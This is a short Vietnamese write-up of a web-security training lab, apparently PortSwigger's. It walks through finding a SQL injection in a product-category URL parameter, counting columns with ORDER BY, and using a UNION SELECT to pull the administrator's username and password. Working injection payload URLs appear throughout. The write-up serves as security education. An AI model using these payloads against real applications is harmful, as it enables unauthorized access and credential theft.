![Giao diện lab ban đầu](images/Pasted%20image%2020260530170947.png)
# Tổng quan về lab
-Đầu tiên ta truy cập vào lab sử dụng các chứng năng như một client.Khi bấm vào Corporate gifts thì ta thấy ở url:
```LINK
https://0adc00c1049a670880b8621d0024005d.web-security-academy.net/filter?category=Corporate+gifts
```
Ta thấy có phần `category=Corporate+gifts` rất đáng nghi đây là một lỗi về SQLi,ta thử 
`OR 1=1--` vào url:
```LINK
https://0adc00c1049a670880b8621d0024005d.web-security-academy.net/filter?category=Corporate+gifts'+OR+1=1--
```
Ta thấy nó hiện ra tất cả các mục => SQLi

Mục tiêu của bài lab: Tác giả cho biết có bảng `users` gồm có 2 cột là `username` và `password`,dùng UNION attack để lấy tài khoản và mật khẩu của tài khoản có username là administrator

# Khai thác

Đầu tiên trước hết ta dùng `ORDER BY 1,2,3,4... --` để xác định số cột của câu truy vấn trước 
```LINK
https://0adc00c1049a670880b8621d0024005d.web-security-academy.net/filter?category=Corporate+gifts'+ORDER+BY+1--

https://0adc00c1049a670880b8621d0024005d.web-security-academy.net/filter?category=Corporate+gifts'+ORDER+BY+2--
```
Khi đến `ORDER BY 3---` thì server bị lỗi 
![ORDER BY 3 bị lỗi](images/Pasted%20image%2020260531235113.png)
=> câu truy vấn SELECT trước gồm có 2 cột,ta sẽ dùng UNION SELECT 2 cột:
```LINK
https://0adc00c1049a670880b8621d0024005d.web-security-academy.net/filter?category=Corporate+gifts'+UNION+SELECT+username,password+FROM+users+WHERE+username='administrator'--
```
Lúc này,ta đã thấy `administrator` và password của username đó việc còn lại là đăng nhập 
![Lấy được username và password của administrator](images/Pasted%20image%2020260531235130.png)

=> solved
